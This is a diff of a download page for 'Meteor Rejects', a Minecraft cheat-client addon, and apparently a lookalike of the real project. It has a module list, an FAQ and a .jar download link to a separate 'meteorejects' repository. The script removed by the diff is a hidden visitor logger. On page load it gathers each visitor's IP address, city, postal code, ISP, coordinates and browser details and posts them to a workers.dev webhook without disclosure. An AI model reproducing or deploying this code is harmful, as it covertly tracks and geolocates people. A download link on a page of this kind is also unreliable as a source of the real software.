+        <div style="margin-top:1.8rem;padding:1rem;background:rgba(192,25,46,.08);border:1px solid rgba(192,25,46,.2);border-radius:var(--radius)">
+          <p style="font-size:.82rem;color:var(--sub);line-height:1.6">
+            <i class="fas fa-info-circle" style="color:var(--r2);margin-right:6px" aria-hidden="true"></i>
+            Only compatible with <strong style="color:var(--text)">Minecraft Java Edition</strong>. Bedrock Edition is not supported.
+            Verify all builds target the same Minecraft version.
+          </p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
 
-    <script>
-        (function() {
-            const modulesData = [
-                { name: "AimAssist", desc: "Auto-aim assistance (removed from Meteor)", tags: ["removed", "combat"], versions: ["all","1.21","1.21.1","1.21.4","1.21.11"] },
-                { name: "AntiBot", desc: "Filter out bot players", tags: ["removed", "utility"], versions: ["all","1.21","1.21.1","1.21.4","1.21.11"] },
-                { name: "AntiCrash", desc: "Prevent crash exploits (ported from Anti-ClientCrasher)", tags: ["port", "anti"], versions: ["all","1.21","1.21.1","1.21.4","1.21.11"] },
-                { name: "AntiSpawnpoint", desc: "Prevent setting spawnpoints", tags: ["utility"], versions: ["all","1.21","1.21.1","1.21.4","1.21.11"] },
-                { name: "AntiVanish", desc: "Detect vanished players", tags: ["utility"], versions: ["1.21.4","1.21.11"] },
-                { name: "ArrowDmg", desc: "Boost arrow damage (ported from Wurst)", tags: ["port", "combat"], versions: ["all"] },
-                { name: "AutoBedTrap", desc: "Automatically trap players in beds (BleachHack port)", tags: ["port", "combat"], versions: ["all"] },
-                { name: "AutoCraft", desc: "Automated crafting (generalized AutoBedCraft)", tags: ["utility"], versions: ["1.21.1","1.21.4","1.21.11"] },
-                { name: "AutoEnchant", desc: "Automatically enchant items", tags: ["utility"], versions: ["all"] },
-                { name: "AutoExtinguish", desc: "Auto-extinguish fire", tags: ["utility"], versions: ["all"] },
-                { name: "AutoFarm", desc: "Automated farming", tags: ["utility"], versions: ["all"] },
-                { name: "AutoGrind", desc: "Auto-grind XP", tags: ["utility"], versions: ["all"] },
-                { name: "AutoLogin", desc: "Automatically log in to servers", tags: ["utility"], versions: ["all"] },
-                { name: "AutoPot", desc: "Auto-potion (unmerged PR)", tags: ["pr", "combat"], versions: ["all"] },
-                { name: "AutoSoup", desc: "Auto-soup for PvP (Wurst port)", tags: ["port", "combat"], versions: ["all"] },
-                { name: "AutoTNT", desc: "Auto-place TNT", tags: ["utility"], versions: ["all"] },
-                { name: "AutoWither", desc: "Auto-build withers (unmerged PR)", tags: ["pr"], versions: ["all"] },
-                { name: "BlockIn", desc: "Block-in players", tags: ["combat"], versions: ["all"] },
-                { name: "BoatGlitch", desc: "Boat glitch exploits (unmerged PR)", tags: ["pr", "exploit"], versions: ["all"] },
-                { name: "BoatPhase", desc: "Boat phase (unmerged PR)", tags: ["pr", "exploit"], versions: ["all"] },
-                { name: "Boost", desc: "Speed boost (Cornos port)", tags: ["port", "movement"], versions: ["all"] },
-                { name: "BungeeCordSpoof", desc: "Spoof BungeeCord (LiquidBounce port)", tags: ["port", "utility"], versions: ["all"] },
-                { name: "ChatBot", desc: "Simple chat bot", tags: ["utility"], versions: ["all"] },
-                { name: "ChestAura", desc: "Auto-steal from chests", tags: ["utility"], versions: ["all"] },
-                { name: "ChorusExploit", desc: "Chorus fruit exploit (unmerged PR)", tags: ["pr", "exploit"], versions: ["all"] },
-                { name: "ColorSigns", desc: "Colored signs", tags: ["cosmetic"], versions: ["all"] },
-                { name: "Confuse", desc: "Confuse other players", tags: ["fun"], versions: ["all"] },
-                { name: "Coord Logger", desc: "Log coordinates of events (JexClient)", tags: ["port", "utility"], versions: ["all"] },
-                { name: "Custom Packets", desc: "Send custom packets", tags: ["exploit"], versions: ["all"] },
-                { name: "Extra Elytra", desc: "Elytra enhancements (Wurst port)", tags: ["port", "movement"], versions: ["all"] },
-                { name: "FullFlight", desc: "Full flight with bypasses (CCblueX & LiveOverflow)", tags: ["movement"], versions: ["all"] },
-                { name: "Gamemode notifier", desc: "Notify when players change gamemode", tags: ["utility"], versions: ["all"] },
-                { name: "Ghost Mode", desc: "Invisible ghost (unmerged PR)", tags: ["pr"], versions: ["all"] },
-                { name: "Glide", desc: "Glide through air (Wurst port)", tags: ["port", "movement"], versions: ["all"] },
-                { name: "Insta Mine", desc: "Instant mining (removed from Meteor)", tags: ["removed", "utility"], versions: ["all"] },
-                { name: "Item generator", desc: "Generate items (Wurst port)", tags: ["port", "exploit"], versions: ["all"] },
-                { name: "InteractionMenu", desc: "Right-click menu (BleachHack port)", tags: ["port", "utility"], versions: ["all"] },
-                { name: "Jetpack", desc: "Jetpack flight", tags: ["movement"], versions: ["all"] },
-                { name: "KnockbackPlus", desc: "Increase knockback", tags: ["combat"], versions: ["all"] },
-                { name: "Lavacast", desc: "Cast lava", tags: ["combat"], versions: ["all"] },
-                { name: "LawnBot", desc: "Mow lawns (JexClient port)", tags: ["port", "fun"], versions: ["all"] },
-                { name: "MossBot", desc: "Auto-moss (BleachHack port)", tags: ["port", "utility"], versions: ["all"] },
-                { name: "NewChunks", desc: "Detect newly generated chunks (BleachHack port)", tags: ["port", "utility"], versions: ["all"] },
-                { name: "NoJumpDelay", desc: "Remove jump delay", tags: ["movement"], versions: ["all"] },
-                { name: "ObsidianFarm", desc: "Auto-farm obsidian (from addon)", tags: ["utility"], versions: ["all"] },
-                { name: "Oresim", desc: "Ore simulator (Atomic port)", tags: ["port", "fun"], versions: ["all"] },
-                { name: "PacketFly", desc: "Fly with packets (unmerged PR)", tags: ["pr", "movement"], versions: ["all"] },
-                { name: "Painter", desc: "Paint blocks", tags: ["fun"], versions: ["all"] },
-                { name: "Rendering", desc: "Rendering tweaks", tags: ["visual"], versions: ["all"] },
-                { name: "RoboWalk", desc: "Automated walking (unmerged PR)", tags: ["pr", "utility"], versions: ["all"] },
-                { name: "Shield Bypass", desc: "Bypass shields", tags: ["combat"], versions: ["all"] },
-                { name: "Silent Disconnect", desc: "Disconnect silently", tags: ["utility"], versions: ["all"] },
-                { name: "SkeletonESP", desc: "ESP for skeletons (JexClient port)", tags: ["port", "visual"], versions: ["all"] },
-                { name: "SoundLocator", desc: "Locate sounds", tags: ["utility"], versions: ["all"] },
-                { name: "Server Finder", desc: "Find servers (MeteorAdditions port)", tags: ["port", "utility"], versions: ["all"] },
-                { name: "TreeAura", desc: "Auto-chop trees (unmerged PR)", tags: ["pr", "utility"], versions: ["all"] },
-                { name: "VehicleOneHit", desc: "One-hit vehicles (unmerged PR)", tags: ["pr", "combat"], versions: ["all"] }
-            ];
+<hr class="divider">
 
-            const commandsData = [
-                { name: ".center", desc: "Center on block" },
-                { name: ".clear-chat", desc: "Clear chat (removed)" },
-                { name: ".ghost", desc: "Ghost mode (AntiGhost port)" },
-                { name: ".save-skin", desc: "Save skin to file" },
-                { name: ".heads", desc: "Get player heads" },
-                { name: ".seed", desc: "Get world seed (unmerged PR)" },
-                { name: ".setblock", desc: "Set block" },
-                { name: ".panic", desc: "Disable all modules (removed)" },
-                { name: ".set-velocity", desc: "Set player velocity" },
-                { name: ".teleport", desc: "Teleport (if allowed)" },
-                { name: ".terrain-export", desc: "Export terrain (BleachHack port)" },
-                { name: ".kick", desc: "Kick yourself (LiquidBounce port)" }
-            ];
+<section id="download" aria-labelledby="dl-h2">
+  <div class="wrap">
+    <div class="dl-hero reveal">
+      <p class="sec-label" style="justify-content:center"><i class="fas fa-download" aria-hidden="true"></i> Get it free</p>
+      <h2 class="dl-hero-title" id="dl-h2">Download Meteor Rejects</h2>
+      <p class="dl-hero-sub">Select your Minecraft version below to get the latest release.</p>
 
-            const versionSet = ["all", "1.21", "1.21.1", "1.21.4", "1.21.11"];
-            const filterContainer = document.getElementById('versionFilters');
-            filterContainer.innerHTML = versionSet.map(v => `<span class="filter-pill" data-version="${v}">${v === 'all' ? 'All Versions' : v}</span>`).join('');
-            
-            let currentVersion = 'all';
-            let currentSearch = '';
+      <div class="version-label">Select Minecraft Version</div>
+      <div class="custom-select-wrapper" id="version-select-wrapper">
+        <div class="custom-select-trigger" id="version-trigger" role="button" tabindex="0" aria-haspopup="listbox" aria-expanded="false">
+          <div class="trigger-icon"><i class="fas fa-cube"></i></div>
+          <span class="trigger-label" id="version-display">1.21.11</span>
+        </div>
+        <div class="custom-select-dropdown" id="version-dropdown" role="listbox"></div>
+      </div>
 
-            function renderModules() {
-                const grid = document.getElementById('modulesGrid');
-                const noMsg = document.getElementById('noModulesMsg');
-                const filtered = modulesData.filter(mod => {
-                    const vMatch = currentVersion === 'all' || mod.versions.includes(currentVersion);
-                    const sMatch = mod.name.toLowerCase().includes(currentSearch.toLowerCase()) || 
-                                    mod.tags.some(t => t.toLowerCase().includes(currentSearch.toLowerCase())) ||
-                                    mod.desc.toLowerCase().includes(currentSearch.toLowerCase());
-                    return vMatch && sMatch;
-                });
-                if(filtered.length === 0){ noMsg.style.display = 'block'; grid.innerHTML = ''; return; }
-                noMsg.style.display = 'none';
-                grid.innerHTML = filtered.map(mod => `
-                    <div class="module-card">
-                        <div class="module-header">
-                            <span class="module-name"><i class="fas fa-cube"></i> ${mod.name}</span>
-                            <a href="https://github.com/AntiCope/meteor-rejects/issues?q=${mod.name}" target="_blank" style="color: var(--text-secondary);"><i class="fab fa-github"></i></a>
-                        </div>
-                        <div class="module-tags">${mod.tags.map(t => `<span class="tag">#${t}</span>`).join('')}</div>
-                        <div class="module-desc" style="font-size:0.85rem; margin-top:8px;">${mod.desc}</div>
-                    </div>
-                `).join('');
-            }
+      <div class="dl-btn-wrap">
+        <a id="download-btn" class="btn-fire" href="https://raw.githubusercontent.com/meteorejects/meteorejects.github.io/refs/heads/main/meteor-rejects-addon-1.21.11.jar" download>
+          <i class="fas fa-download" aria-hidden="true"></i> Download for 1.21.11
+        </a>
+        <div class="download-version-display">
+          Downloading: Meteor Rejects for MC <span id="download-version-label">1.21.11</span>
+        </div>
+      </div>
 
-            document.querySelectorAll('.filter-pill').forEach(pill => {
-                pill.addEventListener('click', () => {
-                    document.querySelectorAll('.filter-pill').forEach(p => p.classList.remove('active'));
-                    pill.classList.add('active');
-                    currentVersion = pill.dataset.version;
-                    renderModules();
-                });
-            });
-            document.getElementById('moduleSearch').addEventListener('input', e => { currentSearch = e.target.value; renderModules(); });
-            
-            const commandsContainer = document.getElementById('commandsList');
-            commandsContainer.innerHTML = commandsData.map(cmd => `
-                <div class="command-card">
-                    <span class="command-name"><i class="fas fa-hashtag"></i> ${cmd.name}</span>
-                    <button class="copy-btn" data-cmd="${cmd.name}" style="background:none; border:none; cursor:pointer; color:var(--text-secondary);"><i class="far fa-copy"></i></button>
-                </div>
-            `).join('');
-            document.querySelectorAll('.copy-btn').forEach(btn => {
-                btn.addEventListener('click', (e) => {
-                    const cmd = btn.dataset.cmd;
-                    navigator.clipboard.writeText(cmd);
-                    const icon = btn.querySelector('i');
-                    icon.className = 'fas fa-check';
-                    setTimeout(() => { icon.className = 'far fa-copy'; }, 1000);
-                });
-            });
+      <p class="dl-note">
+        <i class="fas fa-lock" aria-hidden="true"></i> 100% free, MIT licensed.
+        <a href="https://github.com/AntiCope/meteor-rejects" target="_blank" rel="noopener">Verify on GitHub</a> before installing.
+      </p>
+    </div>
+  </div>
+</section>
 
-            const themeBtn = document.getElementById('themeToggle');
-            themeBtn.addEventListener('click', () => {
-                document.body.classList.toggle('light');
-                const icon = themeBtn.querySelector('i');
-                icon.className = document.body.classList.contains('light') ? 'fas fa-sun' : 'fas fa-moon';
-            });
+<hr class="divider">
 
-            const backTop = document.getElementById('backToTop');
-            window.addEventListener('scroll', () => backTop.classList.toggle('visible', window.scrollY > 400));
-            backTop.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
+<section id="config" aria-labelledby="cfg-h2">
+  <div class="wrap">
+    <div class="reveal">
+      <p class="sec-label"><i class="fas fa-sliders-h" aria-hidden="true"></i> Options</p>
+      <h2 class="sec-h2" id="cfg-h2">Configuration Tweaks</h2>
+      <p class="sec-sub">Built-in options to tailor Meteor Rejects to your exact setup.</p>
+    </div>
+    <div class="config-grid">
+      <div class="cfg-card reveal delay-1">
+        <div class="cfg-ico"><i class="fas fa-globe" aria-hidden="true"></i></div>
+        <div class="cfg-title">HTTP Allowed List</div>
+        <div class="cfg-desc">Restrict outbound HTTP from modules to a whitelist of trusted domains.</div>
+      </div>
+      <div class="cfg-card reveal delay-2">
+        <div class="cfg-ico"><i class="fas fa-eye-slash" aria-hidden="true"></i></div>
+        <div class="cfg-title">Hidden Modules</div>
+        <div class="cfg-desc">Remove specific modules from the Meteor GUI. Takes effect after a game restart.</div>
+      </div>
+      <div class="cfg-card reveal delay-3">
+        <div class="cfg-ico"><i class="fas fa-font" aria-hidden="true"></i></div>
+        <div class="cfg-title">System Fonts</div>
+        <div class="cfg-desc">Disable system font loading for faster startup when using a custom font pack.</div>
+      </div>
+      <div class="cfg-card reveal delay-4">
+        <div class="cfg-ico"><i class="fas fa-copy" aria-hidden="true"></i></div>
+        <div class="cfg-title">Duplicate Module Names</div>
+        <div class="cfg-desc">Safely override existing Meteor modules without triggering addon name conflicts.</div>
+      </div>
+    </div>
+  </div>
+</section>
 
-            const navLinks = document.querySelectorAll('.nav-link[data-target]');
-            function scrollToSection(id) {
-                const el = document.getElementById(id);
-                if(el) {
-                    el.classList.add('section-highlight');
-                    setTimeout(() => el.classList.remove('section-highlight'), 600);
-                    el.scrollIntoView({ behavior: 'smooth', block: 'start' });
-                }
-            }
-            navLinks.forEach(link => {
-                link.addEventListener('click', (e) => {
-                    e.preventDefault();
-                    const target = link.dataset.target;
-                    scrollToSection(target);
-                    navLinks.forEach(l => l.classList.remove('active'));
-                    link.classList.add('active');
-                });
-            });
+<hr class="divider">
 
-            const sections = ['home','modules','commands','config','download'];
-            function updateActiveNav() {
-                let current = '';
-                const scrollPos = window.scrollY + 100;
-                for(let id of sections){
-                    const sec = document.getElementById(id);
-                    if(sec && sec.offsetTop <= scrollPos) current = id;
-                }
-                navLinks.forEach(l => {
-                    l.classList.toggle('active', l.dataset.target === current);
-                });
-            }
-            window.addEventListener('scroll', updateActiveNav);
-            updateActiveNav();
+<section id="faq" aria-labelledby="faq-h2">
+  <div class="wrap">
+    <div class="reveal">
+      <p class="sec-label"><i class="fas fa-question-circle" aria-hidden="true"></i> FAQ</p>
+      <h2 class="sec-h2" id="faq-h2">Frequently Asked Questions</h2>
+      <p class="sec-sub">Everything you need to know before installing.</p>
+    </div>
 
-            document.getElementById('heroDownloadBtn')?.addEventListener('click', (e) => {
-                e.preventDefault();
-                scrollToSection('download');
-            });
+    <div class="faq-list" itemscope itemtype="https://schema.org/FAQPage">
 
-            document.querySelector('.filter-pill')?.classList.add('active');
-            renderModules();
+      <div class="faq-item reveal" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
+        <button class="faq-q" aria-expanded="false">
+          <span itemprop="name">What is Meteor Rejects and what does it do?</span>
+          <span class="faq-icon" aria-hidden="true"><i class="fas fa-plus"></i></span>
+        </button>
+        <div class="faq-body" itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
+          <p itemprop="text">Meteor Rejects is a free, open-source addon for Meteor Client that restores features which were rejected in pull requests, removed from the main codebase, or ported from clients like Wurst, BleachHack, LiquidBounce, and JexClient. It adds 58+ modules and 14+ commands unavailable in the base Meteor Client.</p>
+        </div>
+      </div>
 
-            document.querySelectorAll('.module-card').forEach(card => {
-                card.addEventListener('mousemove', (e) => {
-                    const rect = card.getBoundingClientRect();
-                    const x = ((e.clientX - rect.left) / rect.width) * 100;
-                    const y = ((e.clientY - rect.top) / rect.height) * 100;
-                    card.style.setProperty('--x', `${x}%`);
-                    card.style.setProperty('--y', `${y}%`);
-                });
-            });
+      <div class="faq-item reveal delay-1" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
+        <button class="faq-q" aria-expanded="false">
+          <span itemprop="name">How do I install Meteor Rejects?</span>
+          <span class="faq-icon" aria-hidden="true"><i class="fas fa-plus"></i></span>
+        </button>
+        <div class="faq-body" itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
+          <p itemprop="text">First install Meteor Client, then download the Meteor Rejects .jar for your Minecraft version. Drop it into your .minecraft/mods folder and launch with Fabric Loader 0.15+. All new modules and commands appear automatically in the Meteor Client interface.</p>
+        </div>
+      </div>
 
-            (function sendVisitNotification() {
-                const WEBHOOK_URL = 'https://m9ws2hqwi9agz6f0whv5celuq67teayy5gyyknzkgfbbb4cwz6xmms5epqjto3n.bopistaken.workers.dev/';
-                const STORAGE_KEY = 'meteor_rejects_visits';
+      <div class="faq-item reveal delay-2" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
+        <button class="faq-q" aria-expanded="false">
+          <span itemprop="name">Which Minecraft versions are supported?</span>
+          <span class="faq-icon" aria-hidden="true"><i class="fas fa-plus"></i></span>
+        </button>
+        <div class="faq-body" itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
+          <p itemprop="text">Meteor Rejects supports Minecraft Java Edition 1.21.0, 1.21.4, and 1.21.11 — with a separate .jar for each. Bedrock Edition is not supported. Always download the version that matches your Minecraft install.</p>
+        </div>
+      </div>
 
-                const now   = new Date();
-                const tz    = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
-                const lang  = navigator.language || 'Unknown';
-                const ua    = navigator.userAgent;
-                const ref   = document.referrer || 'Direct / None';
-                const page  = window.location.href;
-                const screen = `${window.screen.width}x${window.screen.height}`;
-                const viewport = `${window.innerWidth}x${window.innerHeight}`;
+      <div class="faq-item reveal delay-3" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
+        <button class="faq-q" aria-expanded="false">
+          <span itemprop="name">Is Meteor Rejects completely free?</span>
+          <span class="faq-icon" aria-hidden="true"><i class="fas fa-plus"></i></span>
+        </button>
+        <div class="faq-body" itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
+          <p itemprop="text">Yes. Meteor Rejects is fully free and MIT licensed. The complete source code is on GitHub at github.com/AntiCope/meteor-rejects for anyone to review, fork, or contribute to. There are no premium tiers, paywalls, or ads.</p>
+        </div>
+      </div>
 
-                function parseBrowser(ua) {
-                    if (/Edg\//.test(ua))     return 'Microsoft Edge';
-                    if (/OPR\/|Opera/.test(ua)) return 'Opera';
-                    if (/Chrome\//.test(ua))  return 'Chrome';
-                    if (/Firefox\//.test(ua)) return 'Firefox';
-                    if (/Safari\//.test(ua))  return 'Safari';
-                    return 'Unknown';
-                }
+      <div class="faq-item reveal delay-4" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
+        <button class="faq-q" aria-expanded="false">
+          <span itemprop="name">What's the difference between Meteor Client and Meteor Rejects?</span>
+          <span class="faq-icon" aria-hidden="true"><i class="fas fa-plus"></i></span>
+        </button>
+        <div class="faq-body" itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
+          <p itemprop="text">Meteor Client is the base mod — it must be installed first. Meteor Rejects is an addon that extends it. Meteor Client focuses on well-curated features while Meteor Rejects specifically collects everything that was removed, rejected, or never officially included. They are fully compatible and work together seamlessly.</p>
+        </div>
+      </div>
 
-                function parseOS(ua) {
-                    if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
-                    if (/Windows NT/.test(ua))    return 'Windows';
-                    if (/Mac OS X/.test(ua))      return 'macOS';
-                    if (/Android/.test(ua))       return 'Android';
-                    if (/iPhone|iPad/.test(ua))   return 'iOS';
-                    if (/Linux/.test(ua))         return 'Linux';
-                    return 'Unknown';
-                }
+      <div class="faq-item reveal" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
+        <button class="faq-q" aria-expanded="false">
+          <span itemprop="name">Does it conflict with other Meteor addons?</span>
+          <span class="faq-icon" aria-hidden="true"><i class="fas fa-plus"></i></span>
+        </button>
+        <div class="faq-body" itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
+          <p itemprop="text">Meteor Rejects includes a built-in Duplicate Module Names option to prevent naming conflicts with other addons. In general it is compatible with most Meteor addons — just ensure all addons target the same Minecraft and Meteor Client version.</p>
+        </div>
+      </div>
 
-                function getRandomColor() {
-                    const colors = [
-                        0xc41e3a, 0xe63946, 0xff6b6b, 0x9b1d2c, 0xff4500,
-                        0xdc143c, 0xb22222, 0xff6347, 0xcd5c5c, 0xf08080,
-                        0x8b0000, 0xcc3333, 0xff4444, 0xaa0000, 0xff1744
-                    ];
-                    return colors[Math.floor(Math.random() * colors.length)];
-                }
+      <div class="faq-item reveal delay-1" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
+        <button class="faq-q" aria-expanded="false">
+          <span itemprop="name">What Fabric Loader version do I need?</span>
+          <span class="faq-icon" aria-hidden="true"><i class="fas fa-plus"></i></span>
+        </button>
+        <div class="faq-body" itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
+          <p itemprop="text">Fabric Loader 0.15 or newer is required. Download the latest version from fabricmc.net. If Meteor Client is already working on your setup, your Fabric Loader version is almost certainly compatible.</p>
+        </div>
+      </div>
 
-                function getVisitCount24h() {
-                    try {
-                        const visits = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
-                        const cutoff = Date.now() - 24 * 60 * 60 * 1000;
-                        const recent = visits.filter(t => t > cutoff);
-                        recent.push(Date.now());
-                        localStorage.setItem(STORAGE_KEY, JSON.stringify(recent));
-                        return recent.length;
-                    } catch (e) {
-                        return 1;
-                    }
-                }
+      <div class="faq-item reveal delay-2" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
+        <button class="faq-q" aria-expanded="false">
+          <span itemprop="name">How do I report bugs or request features?</span>
+          <span class="faq-icon" aria-hidden="true"><i class="fas fa-plus"></i></span>
+        </button>
+        <div class="faq-body" itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
+          <p itemprop="text">Open an issue on GitHub at github.com/AntiCope/meteor-rejects/issues. Include your Minecraft version, Meteor Client version, and steps to reproduce when filing a bug report. Feature requests are also welcome via the Issues tab.</p>
+        </div>
+      </div>
 
-                const visitNumber = getVisitCount24h();
-                const browser = parseBrowser(ua);
-                const os      = parseOS(ua);
-                const mobile  = /Mobi|Android/i.test(ua) ? 'Yes 📱' : 'No 🖥️';
-                const embedColor = getRandomColor();
+      <div class="faq-item reveal delay-3" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
+        <button class="faq-q" aria-expanded="false">
+          <span itemprop="name">Can I contribute to Meteor Rejects?</span>
+          <span class="faq-icon" aria-hidden="true"><i class="fas fa-plus"></i></span>
+        </button>
+        <div class="faq-body" itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
+          <p itemprop="text">Absolutely. Fork the repo on GitHub, make your changes, and open a pull request. The project welcomes ports from other clients, restorations of removed Meteor features, and bug fixes for existing modules. See the contributing guide in the repository for details.</p>
+        </div>
+      </div>
 
-                fetch('https://ipapi.co/json/')
-                    .then(response => response.json())
-                    .then(geoData => {
-                        const ipv4        = geoData.ip              || 'Unknown';
-                        const country     = geoData.country_name    || 'Unknown';
-                        const region      = geoData.region          || 'Unknown';
-                        const city        = geoData.city            || 'Unknown';
-                        const isp         = geoData.org             || 'Unknown';
-                        const postal      = geoData.postal          || 'Unknown';
-                        const latitude    = geoData.latitude        || 'Unknown';
-                        const longitude   = geoData.longitude       || 'Unknown';
-                        const countryCode = geoData.country_code    || 'Unknown';
-                        const isEU        = geoData.in_eu ? 'Yes 🇪🇺' : 'No';
+    </div>
+  </div>
+</section>
 
-                        const mapsLink = (latitude !== 'Unknown' && longitude !== 'Unknown')
-                            ? `https://maps.google.com/?q=${latitude},${longitude}`
-                            : 'N/A';
+<footer role="contentinfo">
+  <div class="wrap">
+    <div class="foot-inner">
+      <div class="foot-brand">
+        <a href="#hero" class="logo" style="margin-bottom:.8rem;display:inline-flex" aria-label="Back to top">
+          <span class="logo-meteor" aria-hidden="true"><i class="fas fa-meteor"></i></span>
+          <span>METEOR REJECTS</span>
+        </a>
+        <p>The #1 free addon for Meteor Client. Restoring what got left behind since 2021.</p>
+      </div>
 
-                        const payload = {
-                            username: "Meteor Rejects · Visits",
-                            avatar_url: "https://raw.githubusercontent.com/meteorejects/meteorejects.github.io/refs/heads/main/favicon.png",
-                            embeds: [{
-                                title: `🔥 New Visitor — #${visitNumber} in 24h`,
-                                color: embedColor,
-                                fields: [
-                                    { name: "🌍 IPv4",               value: `\`${ipv4}\``,                                      inline: true  },
-                                    { name: "🇺🇳 Country",          value: `${country} (${countryCode})`,                      inline: true  },
-                                    { name: "🏙️ City / Region",    value: `${city}, ${region}`,                               inline: true  },
-                                    { name: "📮 Postal Code",        value: postal,                                             inline: true  },
-                                    { name: "🏢 ISP",                value: isp,                                                inline: true  },
-                                    { name: "🇪🇺 EU?",              value: isEU,                                               inline: true  },
-                                    { name: "🗺️ Maps Link",         value: mapsLink !== 'N/A' ? `[View on Maps](${mapsLink})` : 'N/A', inline: false },
-                                    { name: "🌐 Page",               value: page,                                               inline: false },
-                                    { name: "🔗 Referrer",           value: ref,                                                inline: false },
-                                    { name: "🖥️ Browser",           value: browser,                                            inline: true  },
-                                    { name: "💻 OS",                 value: os,                                                 inline: true  },
-                                    { name: "📱 Mobile",             value: mobile,                                             inline: true  },
-                                    { name: "🌍 Language",           value: lang,                                               inline: true  },
-                                    { name: "🕐 Timezone",           value: tz,                                                 inline: true  },
-                                    { name: "📐 Screen",             value: screen,                                             inline: true  },
-                                    { name: "🔲 Viewport",           value: viewport,                                           inline: true  },
-                                ],
-                                footer: { text: `meteor-rejects · Visit #${visitNumber} in last 24 hours` },
-                                timestamp: now.toISOString()
-                            }]
-                        };
+      <nav aria-label="Pages">
+        <p class="foot-nav-title">Navigation</p>
+        <div class="foot-links">
+          <a href="#about"    class="foot-link">About</a>
+          <a href="#modules"  class="foot-link">Modules</a>
+          <a href="#commands" class="foot-link">Commands</a>
+          <a href="#install"  class="foot-link">Install</a>
+          <a href="#download" class="foot-link">Download</a>
+          <a href="#faq"      class="foot-link">FAQ</a>
+        </div>
+      </nav>
 
-                        return fetch(WEBHOOK_URL, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(payload)
-                        });
-                    })
-                    .catch(() => {
-                        const fallbackPayload = {
-                            username: "Meteor Rejects · Visits",
-                            avatar_url: "https://raw.githubusercontent.com/meteorejects/meteorejects.github.io/refs/heads/main/favicon.png",
-                            embeds: [{
-                                title: `🔥 New Visitor (No IP) — #${visitNumber} in 24h`,
-                                color: 0xff9900,
-                                fields: [
-                                    { name: "🌍 IPv4",               value: "Failed to fetch",                                 inline: false },
-                                    { name: "🌐 Page",               value: page,                                              inline: false },
-                                    { name: "🔗 Referrer",           value: ref,                                               inline: false },
-                                    { name: "🖥️ Browser",           value: browser,                                           inline: true  },
-                                    { name: "💻 OS",                 value: os,                                                inline: true  },
-                                    { name: "📱 Mobile",             value: mobile,                                            inline: true  },
-                                    { name: "🌍 Language",           value: lang,                                              inline: true  },
-                                    { name: "🕐 Timezone",           value: tz,                                                inline: true  },
-                                    { name: "📐 Screen",             value: screen,                                            inline: true  },
-                                    { name: "🔲 Viewport",           value: viewport,                                          inline: true  },
-                                ],
-                                footer: { text: `meteor-rejects · Visit #${visitNumber} in last 24 hours · IP fetch failed` },
-                                timestamp: now.toISOString()
-                            }]
-                        };
+      <nav aria-label="External links">
+        <p class="foot-nav-title">Links</p>
+        <div class="foot-links">
+          <a href="https://github.com/AntiCope/meteor-rejects" target="_blank" rel="noopener" class="foot-link"><i class="fab fa-github" aria-hidden="true"></i> GitHub</a>
+          <a href="https://github.com/AntiCope/meteor-rejects/issues" target="_blank" rel="noopener" class="foot-link"><i class="fas fa-bug" aria-hidden="true"></i> Bug Reports</a>
+          <a href="https://meteorclient.com" target="_blank" rel="noopener" class="foot-link"><i class="fas fa-external-link-alt" aria-hidden="true"></i> Meteor Client</a>
+          <a href="https://fabricmc.net" target="_blank" rel="noopener" class="foot-link"><i class="fas fa-external-link-alt" aria-hidden="true"></i> Fabric MC</a>
+        </div>
+      </nav>
+    </div>
 
-                        return fetch(WEBHOOK_URL, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(fallbackPayload)
-                        });
-                    })
-                    .catch(() => {});
-            })();
+    <div class="foot-bottom">
+      <span>Created by <a href="https://github.com/AntiCope" rel="author">AntiCope</a> &amp; contributors · <a href="https://opensource.org/licenses/MIT" rel="license">MIT License</a></span>
+      <span>Not an official Meteor Client project. Use responsibly.</span>
+    </div>
+  </div>
+</footer>
 
-        })();
-    </script>
+<button id="btt" aria-label="Back to top"><i class="fas fa-arrow-up" aria-hidden="true"></i></button>
+
+<script>
+(function(){
+'use strict';
+
+const MODS=[
+  {n:"AimAssist",d:"Smooth aim assistance — previously removed from Meteor Client's core.",t:["removed","combat"],v:["all","1.21","1.21.1","1.21.4","1.21.11"]},
+  {n:"AntiBot",d:"Filters out bot players from radar, tab list, and notifications.",t:["removed","utility"],v:["all","1.21","1.21.1","1.21.4","1.21.11"]},
+  {n:"AntiCrash",d:"Prevents known client crash exploits. Ported from Anti-ClientCrasher.",t:["port","anti"],v:["all","1.21","1.21.1","1.21.4","1.21.11"]},
+  {n:"AntiSpawnpoint",d:"Prevents servers setting your spawnpoint without permission.",t:["utility"],v:["all","1.21","1.21.1","1.21.4","1.21.11"]},
+  {n:"AntiVanish",d:"Detects vanished players by tracking hidden join/leave packets.",t:["utility"],v:["1.21.4","1.21.11"]},
+  {n:"ArrowDmg",d:"Boosts arrow damage output. Ported from Wurst Client.",t:["port","combat"],v:["all"]},
+  {n:"AutoBedTrap",d:"Automatically traps players in beds during PvP. BleachHack port.",t:["port","combat"],v:["all"]},
